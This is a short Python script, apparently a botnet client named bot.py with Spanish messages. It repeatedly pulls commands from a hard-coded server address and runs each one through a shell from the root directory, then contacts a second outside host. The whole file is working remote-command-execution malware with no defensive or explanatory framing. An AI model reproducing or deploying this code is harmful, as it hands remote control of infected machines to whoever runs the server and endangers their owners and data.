import requests
import time
import os
from urllib.request import urlopen
import multiprocessing
import subprocess
import sys



def get_cmd():
    global cmd
    cmd = requests.get('http://10.43.143.51/getcmd')
    print("EJECUTANDO ======"+ cmd.text + "======")
    p1 = multiprocessing.Process(name="p1",target=run_ssh)
    p1.start()


def run_ssh():
    try:
        output = subprocess.check_output(cmd.text, shell=True).decode('utf-8')
        time.sleep(6)
        requests.get('http://p3rl4.me/getcmd')
        print(output)
    except:
        print("Ha habido un error con su comando")


def online():
    pass

def main():
    while True:
        time.sleep(2)
        try:
            online()
            get_cmd()
        except:
            print("Ha ocurrido un error, Seguramente el servidor no este en linea")

if __name__ == '__main__':
    os.chdir('/')
    global id
    try:
        id=sys.argv[1]
        main()
    except KeyboardInterrupt:
        print("CERRANDO TODO :::::.......")
    except:
        print("""Necesitas proporcionar un id numérico
Ej: python3 bot.py 1""")